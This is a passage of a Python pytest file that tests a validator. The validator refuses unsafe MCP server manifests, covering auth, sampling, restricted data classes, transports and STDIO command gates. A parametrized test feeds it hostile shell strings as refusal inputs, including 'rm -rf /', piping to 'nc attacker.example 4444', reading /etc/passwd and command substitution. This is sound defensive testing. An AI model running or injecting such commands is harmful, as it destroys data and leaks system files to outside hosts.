"""Sprint-5 T6.2 — `protocol.mcp_capabilities.validate_mcp_manifest` contract tests.

Critical-controls module per AGENTS.md (Plugin trust + supply chain
— the manifest validator is the only place AgentOS interprets pack-
declared capability blocks before admission, and its closed-enum
refusal vocabulary is what every other Sprint-5 surface keys off).

Test classes (per Sprint-5 plan §T6.2):

  TestAnonymousMcpRefused                     — no auth + no api-key fallback
  TestResourcesOptional                       — resources_supported gates list/read
  TestSamplingDefaultDeny                     — 4-condition gate via OPA
  TestElicitationFormRestrictedDataClass      — form mode + restricted PII/payment/regulator data
  TestCachingTtlRestrictedDataClass           — ttl strategy + restricted data
  TestStdioManifestIncomplete                 — STDIO missing command/args/env_allowlist
  TestStdioManifestShellMetacharacter         — STDIO command shell metachars
  TestStdioCommandNotAllowlisted              — STDIO command not on per-tenant allow-list
  TestStdioDisabledInSprint5                  — Decision Lock umbrella refusal (Sprint 5)
  TestValidationOutcomeShape                  — ManifestValidation dataclass surface

The validator is largely pure-functional; the only I/O is OPA for
the sampling 4-condition gate, which is invoked through a stub
``OPAEngine`` mock (NOT the real subprocess) so tests don't depend
on the OPA binary being installed.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest

from cognic_agentos.protocol.mcp_capabilities import (
    ManifestValidation,
    ValidationContext,
    ValidationReason,
    validate_mcp_manifest,
)

# ---------------------------------------------------------------------------
# Fixtures + helpers
# ---------------------------------------------------------------------------


def _base_manifest(**overrides: Any) -> dict[str, Any]:
    """A baseline-passing HTTP-OAuth manifest. Per-test override of
    specific blocks via the kwargs lets tests focus on the field
    they're exercising without re-spelling every other field."""
    manifest: dict[str, Any] = {
        "tool": {
            "cognic": {
                "identity": {
                    "pack_id": "cognic-test-mcp-pack",
                    "pack_version": "0.1.0",
                },
                "mcp": {
                    "transport": "http",
                    "auth": "oauth-prm",
                    "server_url": "https://server.example/mcp",
                    "scopes": ["mcp:tools"],
                },
                "runtime": {"risk_tier": "read_only"},
                "data_governance": {"data_classes": []},
            }
        }
    }
    # Apply mcp-block overrides for terseness in tests.
    if "mcp" in overrides:
        manifest["tool"]["cognic"]["mcp"].update(overrides.pop("mcp"))
    if "tools" in overrides:
        manifest["tool"]["cognic"]["tools"] = overrides.pop("tools")
    # Any remaining overrides splat under tool.cognic.<key>.
    for key, value in overrides.items():
        manifest["tool"]["cognic"][key] = value
    return manifest


def _ctx(
    *,
    tenant_id: str = "bank_a",
    stdio_command_allowlist: frozenset[str] = frozenset(),
    sampling_decision_allow: bool = False,
    tenant_sampling_permitted: bool = False,
    cloud_policy_tier_consistent: bool = True,
    cloud_policy_allow_external_llm_consistent: bool = True,
    opa_engine: Any = None,
) -> ValidationContext:
    """Build a ValidationContext with sensible defaults for each test.

    ``sampling_decision_allow`` drives the mock OPA engine's allow
    output. The sampling check ONLY runs when the manifest declares
    ``sampling_supported = true`` (validator skips OPA otherwise).
    """
    if opa_engine is None:
        # Default mock OPA engine: returns allow=sampling_decision_allow
        # when called, regardless of input. Tests that assert OPA was
        # invoked check the mock's call args directly.
        opa_engine = MagicMock()
        from cognic_agentos.core.policy.engine import Decision

        opa_engine.evaluate = AsyncMock(
            return_value=Decision(
                allow=sampling_decision_allow,
                rule_matched="data.cognic.sampling.allow",
                reasoning="test mock",
                decision_data=None,
            )
        )
    return ValidationContext(
        tenant_id=tenant_id,
        stdio_command_allowlist=stdio_command_allowlist,
        tenant_sampling_permitted=tenant_sampling_permitted,
        cloud_policy_tier_consistent=cloud_policy_tier_consistent,
        cloud_policy_allow_external_llm_consistent=cloud_policy_allow_external_llm_consistent,
        opa_engine=opa_engine,
        sampling_policy_bundle=Path("policies/_default/sampling.rego"),
    )


# ---------------------------------------------------------------------------
# Auth surface — anonymous refusal
# ---------------------------------------------------------------------------


class TestAnonymousMcpRefused:
    async def test_no_auth_field_refused(self) -> None:
        """Manifest's ``[tool.cognic.mcp]`` lacks an ``auth`` declaration
        AND no api-key fallback → anonymous server, refused per
        ADR-002 §"MCP Authorization"."""
        manifest = _base_manifest()
        # Strip the auth field
        del manifest["tool"]["cognic"]["mcp"]["auth"]

        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_anonymous_refused"

    async def test_explicit_anonymous_auth_value_refused(self) -> None:
        """Some packs may explicitly declare ``auth = "anonymous"`` —
        same outcome as missing auth field. Defensive coverage."""
        manifest = _base_manifest(mcp={"auth": "anonymous"})

        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_anonymous_refused"

    async def test_oauth_prm_auth_accepted(self) -> None:
        """``auth = "oauth-prm"`` (Sprint-5 default) → passes anon
        check (other gates may still fire)."""
        manifest = _base_manifest()  # default already has oauth-prm
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_api_key_fallback_accepted_at_validator_layer(self) -> None:
        """``auth = "api-key"`` is accepted at the validator layer;
        the actual Vault-path resolution happens in the registry's
        auth-probe step (T6.3). Validator's job is to reject only the
        TRULY anonymous case."""
        manifest = _base_manifest(
            mcp={
                "auth": "api-key",
                "api_key_vault_path": "secret/cognic/bank_a/mcp-api-key",
                "api_key_deprecation_acknowledged": True,
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True


# ---------------------------------------------------------------------------
# Resources gate
# ---------------------------------------------------------------------------


class TestResourcesOptional:
    async def test_resources_supported_false_accepted(self) -> None:
        """Default state: resources not supported → no list/read
        declarations needed."""
        manifest = _base_manifest(mcp={"resources_supported": False})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_resources_supported_true_with_list_and_read_accepted(self) -> None:
        """``resources_supported = true`` AND both ``resources_list_supported``
        and ``resources_read_supported`` declared → accepted."""
        manifest = _base_manifest(
            mcp={
                "resources_supported": True,
                "resources_list_supported": True,
                "resources_read_supported": True,
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_resources_supported_true_missing_list_refused(self) -> None:
        """``resources_supported = true`` AND ``resources_list_supported``
        missing/false → refused with mcp_resources_declared_but_no_list."""
        manifest = _base_manifest(
            mcp={
                "resources_supported": True,
                "resources_read_supported": True,
                # resources_list_supported missing
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_resources_declared_but_no_list"

    async def test_resources_supported_true_missing_read_refused(self) -> None:
        manifest = _base_manifest(
            mcp={
                "resources_supported": True,
                "resources_list_supported": True,
                # resources_read_supported missing
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_resources_declared_but_no_list"


# ---------------------------------------------------------------------------
# Sampling default-deny — 4-condition Rego gate
# ---------------------------------------------------------------------------


class TestSamplingDefaultDeny:
    async def test_sampling_supported_true_all_conditions_met_accepted(self) -> None:
        """Pack declares sampling_supported=true; tenant + cloud policy
        all align → OPA returns allow=true → validator accepts."""
        manifest = _base_manifest(mcp={"sampling_supported": True})
        ctx = _ctx(
            sampling_decision_allow=True,
            tenant_sampling_permitted=True,
            cloud_policy_tier_consistent=True,
            cloud_policy_allow_external_llm_consistent=True,
        )

        result = await validate_mcp_manifest(manifest, context=ctx)
        assert result.ok is True
        # OPA was actually called with the four-tuple input. Cast
        # via Any so mypy doesn't complain about the MagicMock-
        # injected ``assert_awaited_once`` / ``call_args`` attrs on
        # the OPAEngine | None union type.
        opa_mock: Any = ctx.opa_engine
        opa_mock.evaluate.assert_awaited_once()
        call_input = opa_mock.evaluate.call_args.kwargs["input"]
        assert call_input["pack"]["sampling_supported"] is True
        assert call_input["tenant"]["sampling_permitted"] is True
        assert call_input["cloud_policy"]["tier_consistent"] is True
        assert call_input["cloud_policy"]["allow_external_llm_consistent"] is True

    async def test_sampling_supported_true_tenant_denies_refused(self) -> None:
        """Pack declares sampling_supported=true but tenant policy
        forbids → OPA returns allow=false → refused with
        mcp_sampling_default_denied."""
        manifest = _base_manifest(mcp={"sampling_supported": True})
        ctx = _ctx(
            sampling_decision_allow=False,
            tenant_sampling_permitted=False,  # tenant denies
        )

        result = await validate_mcp_manifest(manifest, context=ctx)
        assert result.ok is False
        assert result.reason == "mcp_sampling_default_denied"

    async def test_sampling_supported_false_skips_opa(self) -> None:
        """If sampling_supported is false (default), the OPA path
        MUST NOT be invoked — sampling isn't requested."""
        manifest = _base_manifest()  # no sampling_supported → defaults false
        ctx = _ctx()

        result = await validate_mcp_manifest(manifest, context=ctx)
        assert result.ok is True
        opa_mock: Any = ctx.opa_engine
        opa_mock.evaluate.assert_not_awaited()

    async def test_sampling_supported_true_no_opa_engine_fail_closed(self) -> None:
        """Pack requests sampling but no OPA engine wired up → fail
        closed (default-deny posture; Sprint-4 doctrine: any policy-
        engine unavailability is a deny)."""
        manifest = _base_manifest(mcp={"sampling_supported": True})
        ctx = _ctx(opa_engine=...)  # explicit None below
        # Re-build context with opa_engine=None
        ctx = ValidationContext(
            tenant_id="bank_a",
            stdio_command_allowlist=frozenset(),
            tenant_sampling_permitted=True,
            cloud_policy_tier_consistent=True,
            cloud_policy_allow_external_llm_consistent=True,
            opa_engine=None,
            sampling_policy_bundle=Path("policies/_default/sampling.rego"),
        )

        result = await validate_mcp_manifest(manifest, context=ctx)
        assert result.ok is False
        assert result.reason == "mcp_sampling_default_denied"


# ---------------------------------------------------------------------------
# Restricted data class gates
# ---------------------------------------------------------------------------


class TestElicitationFormRestrictedDataClass:
    async def test_form_mode_with_customer_pii_refused(self) -> None:
        """Tool declares ``elicitation_modes = ["form"]`` AND any tool
        in the manifest's tools list has ``data_classes`` containing
        ``customer_pii`` → refused. Form-mode elicitation can leak
        PII into a UI surface that AgentOS doesn't have visibility
        into; ADR-002 + ADR-017 forbid the combination."""
        manifest = _base_manifest(
            mcp={"elicitation_modes": ["form"]},
            tools=[
                {"name": "search_customer", "data_classes": ["customer_pii"]},
            ],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_elicitation_form_restricted_data_class"

    async def test_form_mode_with_payment_action_refused(self) -> None:
        manifest = _base_manifest(
            mcp={"elicitation_modes": ["form"]},
            tools=[{"name": "transfer", "data_classes": ["payment_action"]}],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.reason == "mcp_elicitation_form_restricted_data_class"

    async def test_form_mode_with_regulator_communication_refused(self) -> None:
        manifest = _base_manifest(
            mcp={"elicitation_modes": ["form"]},
            tools=[{"name": "file_sar", "data_classes": ["regulator_communication"]}],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.reason == "mcp_elicitation_form_restricted_data_class"

    async def test_form_mode_with_safe_data_class_accepted(self) -> None:
        """Form mode + non-restricted data classes (e.g., public_data) → ok."""
        manifest = _base_manifest(
            mcp={"elicitation_modes": ["form"]},
            tools=[{"name": "look_up_branch", "data_classes": ["public_data"]}],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_no_form_mode_with_restricted_data_class_accepted(self) -> None:
        """Tool has restricted data class but pack does NOT advertise
        form-mode elicitation → ok (it's the COMBINATION that's
        forbidden, not either alone)."""
        manifest = _base_manifest(
            mcp={"elicitation_modes": ["text"]},
            tools=[{"name": "x", "data_classes": ["customer_pii"]}],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True


class TestCachingTtlRestrictedDataClass:
    async def test_ttl_caching_with_restricted_data_class_refused(self) -> None:
        """Tool declares ``caching_strategy = "ttl"`` AND data_classes
        contain a restricted class → refused with
        mcp_caching_ttl_restricted_data_class. TTL caching of
        restricted data persists it past the operation it was
        authorised for."""
        manifest = _base_manifest(
            tools=[
                {
                    "name": "lookup_account",
                    "caching_strategy": "ttl",
                    "data_classes": ["customer_pii"],
                }
            ],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_caching_ttl_restricted_data_class"

    async def test_no_caching_with_restricted_data_class_accepted(self) -> None:
        manifest = _base_manifest(
            tools=[
                {
                    "name": "lookup_account",
                    "caching_strategy": "none",
                    "data_classes": ["customer_pii"],
                }
            ],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_ttl_caching_with_public_data_accepted(self) -> None:
        manifest = _base_manifest(
            tools=[
                {
                    "name": "branch_directory",
                    "caching_strategy": "ttl",
                    "data_classes": ["public_data"],
                }
            ],
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True


# ---------------------------------------------------------------------------
# STDIO transport — four gates per ADR-002 §"MCP STDIO threat model"
# ---------------------------------------------------------------------------


class TestStdioManifestIncomplete:
    """Per the threat-model gate 1 (manifest validation): STDIO
    transport requires ``command``, ``args``, ``env_allowlist`` to all
    be declared. Missing any → refused with mcp_stdio_manifest_incomplete.
    These shape gates fire BEFORE the umbrella Sprint-5 refusal so
    operators see the most actionable diagnostic first."""

    async def test_stdio_missing_command_refused(self) -> None:
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "args": ["--mode", "mcp"],
                "env_allowlist": ["HOME", "PATH"],
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_stdio_manifest_incomplete"

    async def test_stdio_missing_args_refused(self) -> None:
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": "/usr/bin/python3",
                "env_allowlist": [],
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_stdio_manifest_incomplete"

    async def test_stdio_missing_env_allowlist_refused(self) -> None:
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": "/usr/bin/python3",
                "args": ["-m", "server"],
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_stdio_manifest_incomplete"


class TestStdioManifestShellMetacharacter:
    """Gate 2: command must contain none of ``;``, ``|``, ``&``,
    backticks, ``$``, ``(``, ``)``, ``<``, ``>`` (the standard shell-
    metacharacter set; if any of these appear, the command was
    likely meant to be parsed by a shell — which is exactly what
    the threat model refuses to allow)."""

    @pytest.mark.parametrize(
        "metachar_command",
        [
            "/usr/bin/python3; rm -rf /",  # ;
            "/usr/bin/python3 | nc attacker.example 4444",  # |
            "/usr/bin/python3 & sleep 1",  # &
            "/usr/bin/python3 `whoami`",  # backtick
            "/usr/bin/python3 $(whoami)",  # $()
            "/usr/bin/python3 < /etc/passwd",  # <
            "/usr/bin/python3 > /tmp/out",  # >
        ],
    )
    async def test_command_with_metacharacter_refused(self, metachar_command: str) -> None:
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": metachar_command,
                "args": [],
                "env_allowlist": [],
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_stdio_manifest_shell_metacharacter"

    async def test_non_string_command_falls_through_metachar_gate(self) -> None:
        """Defensive: a STDIO ``command`` declared as a non-string
        (e.g., a list — operator typed it as ``args``) skips the
        metachar set-intersection (which would TypeError on a list)
        and lands at the per-tenant allow-list gate, which refuses
        because no non-string ever appears in the allowlist set."""
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": ["python3", "-m", "server"],  # bad shape
                "args": [],
                "env_allowlist": [],
            }
        )
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        # Fell through to allow-list gate; a non-string never matches.
        assert result.reason == "mcp_stdio_command_not_allowlisted"

    async def test_clean_command_passes_metachar_gate(self) -> None:
        """Plain absolute path with no shell metachars passes this
        gate (next gate is the per-tenant allow-list, then the
        Sprint-5 umbrella refusal)."""
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": "/usr/bin/python3",
                "args": ["-m", "server"],
                "env_allowlist": ["PATH"],
            }
        )
        result = await validate_mcp_manifest(
            manifest,
            context=_ctx(stdio_command_allowlist=frozenset({"/usr/bin/python3"})),
        )
        # Decision Lock umbrella fires last → reason is the umbrella,
        # NOT the shell-metachar reason.
        assert result.reason == "mcp_stdio_disabled_in_sprint_5"


class TestStdioCommandNotAllowlisted:
    """Gate 3: command must be on the per-tenant Vault-stored allow-
    list (``settings.mcp_stdio_command_allowlist_path``)."""

    async def test_command_not_in_allowlist_refused(self) -> None:
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": "/usr/bin/python3",
                "args": [],
                "env_allowlist": [],
            }
        )
        # Allowlist contains a different binary.
        result = await validate_mcp_manifest(
            manifest,
            context=_ctx(stdio_command_allowlist=frozenset({"/opt/cognic/sandbox-runner"})),
        )
        assert result.ok is False
        assert result.reason == "mcp_stdio_command_not_allowlisted"

    async def test_empty_allowlist_refuses_any_command(self) -> None:
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": "/usr/bin/python3",
                "args": [],
                "env_allowlist": [],
            }
        )
        result = await validate_mcp_manifest(
            manifest, context=_ctx(stdio_command_allowlist=frozenset())
        )
        assert result.reason == "mcp_stdio_command_not_allowlisted"


class TestStdioDisabledInSprint5:
    """Gate 4 — the **Decision Lock at the manifest layer**. Even if
    every other STDIO gate (incomplete, shell-metachar, command-
    allowlist) passes, registration in Sprint 5 returns
    mcp_stdio_disabled_in_sprint_5. This is the umbrella refusal
    that makes STDIO fail-closed regardless of operator config until
    Sprint 8 (sandbox primitive)."""

    async def test_otherwise_perfect_stdio_pack_still_refused_in_sprint_5(self) -> None:
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": "/usr/bin/python3",
                "args": ["-m", "server"],
                "env_allowlist": ["PATH"],
            }
        )
        result = await validate_mcp_manifest(
            manifest,
            context=_ctx(stdio_command_allowlist=frozenset({"/usr/bin/python3"})),
        )
        assert result.ok is False
        assert result.reason == "mcp_stdio_disabled_in_sprint_5"


# ---------------------------------------------------------------------------
# ManifestValidation outcome shape
# ---------------------------------------------------------------------------


class TestValidationOutcomeShape:
    async def test_ok_outcome_carries_no_reason(self) -> None:
        manifest = _base_manifest()
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert isinstance(result, ManifestValidation)
        assert result.ok is True
        assert result.reason is None

    async def test_failure_outcome_carries_closed_enum_reason(self) -> None:
        manifest = _base_manifest()
        del manifest["tool"]["cognic"]["mcp"]["auth"]
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        # ValidationReason is the closed-enum literal type (9 values)
        from typing import get_args

        valid_reasons = frozenset(get_args(ValidationReason))
        assert result.reason in valid_reasons

    async def test_non_list_tools_block_is_safely_ignored(self) -> None:
        """Defensive coverage for ``_tools_block``: a manifest with
        ``tool.cognic.tools = "not-a-list"`` (malformed shape) MUST
        be safely treated as no tools — the validator's
        restricted-data-class gates skip rather than KeyError /
        TypeError. Prior gates (e.g., anonymous refusal) still apply."""
        manifest = _base_manifest()
        # Corrupt the tools entry with a non-list shape
        manifest["tool"]["cognic"]["tools"] = "not-a-list"

        result = await validate_mcp_manifest(manifest, context=_ctx())
        # The malformed tools block doesn't crash; baseline manifest
        # passes all gates and returns ok=True.
        assert result.ok is True

    async def test_non_dict_tool_entries_filtered(self) -> None:
        """Defensive: a tools list containing non-dict entries (e.g.,
        a stray string) MUST be filtered out, not crash the
        per-tool gates."""
        manifest = _base_manifest()
        manifest["tool"]["cognic"]["tools"] = [
            "stray-string",
            {"name": "real-tool", "data_classes": []},
            42,
        ]

        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    def test_validation_reason_literal_matches_expected_set(self) -> None:
        """Drift detector: the ValidationReason Literal MUST equal the
        12 capability-side reasons enumerated in the Sprint-5 plan T6.2
        (9 original + ``mcp_transport_unsupported`` added in R1 P1 #2 +
        ``mcp_http_manifest_shape_invalid`` added in T15 R1 P2 #6 +
        ``mcp_tool_data_classes_shape_invalid`` added in T15 R2 P2)."""
        from typing import get_args

        actual = frozenset(get_args(ValidationReason))
        expected = frozenset(
            {
                "mcp_anonymous_refused",
                "mcp_resources_declared_but_no_list",
                "mcp_sampling_default_denied",
                "mcp_elicitation_form_restricted_data_class",
                "mcp_caching_ttl_restricted_data_class",
                "mcp_stdio_manifest_incomplete",
                "mcp_stdio_manifest_shell_metacharacter",
                "mcp_stdio_command_not_allowlisted",
                "mcp_stdio_disabled_in_sprint_5",
                "mcp_transport_unsupported",
                "mcp_http_manifest_shape_invalid",
                "mcp_tool_data_classes_shape_invalid",
            }
        )
        assert actual == expected, (
            f"ValidationReason drift detected. "
            f"Added without test: {actual - expected}; "
            f"Removed without removing: {expected - actual}"
        )


# ---------------------------------------------------------------------------
# Sprint-5 T6 R1 #2 — transport closed-enum (streamable-http canonical;
# unknown / missing transports fail closed)
# ---------------------------------------------------------------------------


class TestTransportClosedEnum:
    """R1 P1 #2: the validator's gate-0 transport check is what stops
    a correctly-spec'd Streamable HTTP pack from silently bypassing
    the registration auth probe. Three invariants:

      1. ``streamable-http`` (the spec-canonical name per
         MCP-CONFORMANCE.md) is accepted as an HTTP transport.
      2. ``http`` (legacy alias) is also accepted.
      3. Anything else (unknown value, missing field, non-string)
         fails closed with ``mcp_transport_unsupported``.
    """

    async def test_streamable_http_canonical_passes(self) -> None:
        """The spec-canonical ``streamable-http`` value MUST pass the
        transport gate (was previously silently ignored — R1 P1 #2)."""
        manifest = _base_manifest(mcp={"transport": "streamable-http"})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_http_legacy_alias_still_passes(self) -> None:
        """Backward-compatibility: packs authored against an earlier
        draft of MCP-CONFORMANCE that used ``transport = "http"``
        still pass."""
        manifest = _base_manifest()  # default declares "http"
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is True

    async def test_stdio_passes_transport_gate_to_reach_stdio_gates(self) -> None:
        """STDIO is a known transport — passes gate 0 — but is
        umbrella-refused at gate 6.d. Test confirms the transport gate
        does NOT pre-empt the STDIO refusal path."""
        manifest = _base_manifest(
            mcp={
                "transport": "stdio",
                "command": "/usr/bin/python3",
                "args": [],
                "env_allowlist": [],
            }
        )
        result = await validate_mcp_manifest(
            manifest,
            context=_ctx(stdio_command_allowlist=frozenset({"/usr/bin/python3"})),
        )
        # STDIO umbrella refusal — NOT mcp_transport_unsupported
        assert result.reason == "mcp_stdio_disabled_in_sprint_5"

    async def test_missing_transport_refused(self) -> None:
        """No ``transport`` field at all → ``mcp_transport_unsupported``.
        Defensive: an MCP manifest without a transport declaration is
        a bug; previously silently fell through to the auth-probe
        branch, which then mapped to neither HTTP nor STDIO and
        returned ``None`` (silent admission)."""
        manifest = _base_manifest()
        del manifest["tool"]["cognic"]["mcp"]["transport"]
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_transport_unsupported"
        assert result.payload["declared_transport"] is None

    async def test_unknown_transport_refused(self) -> None:
        """An unknown transport value (e.g., ``"websocket"``) → fail
        closed. AgentOS does NOT extend MCP transports without an
        ADR-002 amendment."""
        manifest = _base_manifest(mcp={"transport": "websocket"})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_transport_unsupported"
        assert result.payload["declared_transport"] == "websocket"
        # Operator-relevant: payload names the supported set so the
        # fix is direct (rename to streamable-http, or remove the
        # field if not actually MCP).
        assert "streamable-http" in result.payload["supported_transports"]

    async def test_non_string_transport_refused(self) -> None:
        """Defensive: ``transport`` declared as a list / int / null
        → fail closed (the ``in`` check on a frozenset[str] would
        otherwise succeed/fail on hash semantics, not value)."""
        manifest = _base_manifest(mcp={"transport": ["http"]})
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_transport_unsupported"


# ---------------------------------------------------------------------------
# Sprint-5 T6 R2 #2 — defensive accessors against malformed TOML shape
# ---------------------------------------------------------------------------


class TestValidatorSafeAccessors:
    """R2 P2: ``validate_mcp_manifest`` MUST never raise an
    uncaught ``AttributeError`` on pack-controlled TOML, even when
    the manifest's top-level shape is wrong (e.g., ``tool = "bad"``
    or ``[tool.cognic]`` declared as a scalar). The validator's
    safe-walk treats non-dict intermediates as "absent" and falls
    through to the no-MCP-block path → returns
    ``ManifestValidation(ok=False, reason="mcp_anonymous_refused")``
    or ``mcp_transport_unsupported`` depending on which gate fires
    first; never crashes."""

    async def test_non_dict_tool_intermediate_does_not_crash(self) -> None:
        """``manifest = {"tool": "bad"}`` (top-level scalar instead
        of table) used to raise ``AttributeError: 'str' object has
        no attribute 'get'`` from inside ``_mcp_block``. The R2 fix
        makes the safe-walk return ``{}`` so the gate-0 transport
        check fires (no transport declared → unsupported)."""
        manifest: dict[str, Any] = {"tool": "bad"}
        # MUST NOT raise — the validator returns a closed outcome.
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert isinstance(result, ManifestValidation)
        # First gate to fire on an empty MCP block is gate 0 (no transport)
        assert result.ok is False
        assert result.reason == "mcp_transport_unsupported"

    async def test_non_dict_cognic_intermediate_does_not_crash(self) -> None:
        """``manifest = {"tool": {"cognic": "bad"}}`` — same
        AttributeError trap one level deeper."""
        manifest: dict[str, Any] = {"tool": {"cognic": "bad"}}
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_transport_unsupported"

    async def test_non_dict_mcp_intermediate_does_not_crash(self) -> None:
        """``[tool.cognic.mcp] = "bad-value"`` — the validator's
        ``_mcp_block`` returns ``{}`` for the non-dict leaf, so the
        same gate-0 check fires. (The REGISTRY refuses with
        ``mcp_manifest_malformed`` for this case at the higher
        layer; the validator alone treats it as a missing block —
        the layered defense is intentional.)"""
        manifest: dict[str, Any] = {"tool": {"cognic": {"mcp": "string-not-table"}}}
        result = await validate_mcp_manifest(manifest, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_transport_unsupported"

    async def test_non_dict_tools_block_does_not_crash(self) -> None:
        """``[[tool.cognic.tools]]`` declared as a scalar (rare —
        TOML's array-of-tables syntax precludes it normally, but a
        hand-edited manifest could still have it). ``_tools_block``
        returns ``[]`` and the restricted-data-class gates skip."""
        manifest = _base_manifest()
        manifest["tool"]["cognic"]["tools"] = "stray-string"
        result = await validate_mcp_manifest(manifest, context=_ctx())
        # Baseline manifest passes; non-dict tools is just empty
        assert result.ok is True

    async def test_completely_empty_manifest_does_not_crash(self) -> None:
        """``manifest = {}`` (e.g., from an empty TOML file) MUST
        also be handled gracefully — fires the no-transport gate."""
        result = await validate_mcp_manifest({}, context=_ctx())
        assert result.ok is False
        assert result.reason == "mcp_transport_unsupported"

    def test_safe_get_dict_returns_empty_for_non_dict_parent(self) -> None:
        """Direct white-box: ``_safe_get_dict("not a dict", "x")``
        returns ``{}`` instead of raising. Defensive guard for the
        rare case where a caller passes a malformed parent
        directly (the natural flow goes through dicts at every
        level, so this branch only fires from external misuse —
        but the safety net MUST still be there)."""
        from cognic_agentos.protocol.mcp_capabilities import _safe_get_dict

        # Non-dict parent → empty dict regardless of key
        assert _safe_get_dict("not a dict", "tool") == {}
        assert _safe_get_dict(None, "tool") == {}
        assert _safe_get_dict(["list"], "tool") == {}
        assert _safe_get_dict(42, "tool") == {}
        # Dict parent + non-dict value → empty dict
        assert _safe_get_dict({"tool": "scalar"}, "tool") == {}
        # Dict parent + dict value → that value
        assert _safe_get_dict({"tool": {"k": "v"}}, "tool") == {"k": "v"}


# ---------------------------------------------------------------------------
# T15 R2 P2 — pack-controlled data_classes shape gate (fail-CLOSED)
# ---------------------------------------------------------------------------


class TestDataClassesShapeRefusal:
    """T15 R2 P2: a tool's ``data_classes`` field is pack-controlled
    TOML on a cosign-signed manifest. ADR-002 + ADR-017 contract
    requires every field be well-shaped; a malformed value MUST
    fail-CLOSED via the closed-enum :class:`ManifestValidation`
    envelope rather than silently bypassing the form/TTL
    restricted-data refusals.

    R1 history (rejected by the reviewer):
      - The previous bug was a raw ``TypeError`` from
        ``set(tool.get("data_classes", []) or [])`` on shapes like
        ``42`` / ``True`` / dict — the exception bypassed the
        closed-enum envelope and aborted admission without a
        refusal audit row.
      - R1 introduced ``_safe_data_classes`` which coerced any
        non-``list[str]`` shape into an empty set and let the
        downstream gates fall through. That fixed the crash but
        introduced a fail-OPEN posture: signed manifests with
        broken ``data_classes`` would silently bypass the
        restricted-class refusals.

    R2 fix (this class): a new gate before gates 4+5 walks every
    tool block; a malformed ``data_classes`` shape produces
    ``ManifestValidation(ok=False, reason="mcp_tool_data_classes_shape_invalid")``.
    Tools that omit ``data_classes`` entirely (or declare an empty
    list) are well-shaped and pass; only an explicit-but-malformed
    value is a refusal.
    """

    @pytest.mark.parametrize(
        ("malformed_value", "label", "expected_payload_keys"),
        [
            (42, "int", {"declared_type"}),
            (True, "bool", {"declared_type"}),
            ({"customer_pii": True}, "dict", {"declared_type"}),
            ("customer_pii", "string-not-list", {"declared_type"}),
            ([42, "customer_pii"], "list-with-int", {"malformed_entry_type"}),
            ([{"name": "customer_pii"}], "list-with-dict", {"malformed_entry_type"}),
            ([None, "customer_pii"], "list-with-none", {"malformed_entry_type"}),
            (["", "customer_pii"], "list-with-empty-string", set()),
            (["   ", "customer_pii"], "list-with-whitespace", set()),
        ],
    )
    async def test_malformed_data_classes_under_form_elicitation_refused_closed(
        self,
        malformed_value: Any,
        label: str,
        expected_payload_keys: set[str],
    ) -> None:
        """Every malformed shape under the form-elicitation manifest
        produces the closed-enum
        ``mcp_tool_data_classes_shape_invalid`` refusal. The gate
        fires before gates 4 + 5 would consume the field, so a
        malformed value can never silently bypass the form/TTL
        refusals downstream.
        """
        manifest = _base_manifest(
            mcp={"elicitation_modes": ["form"]},
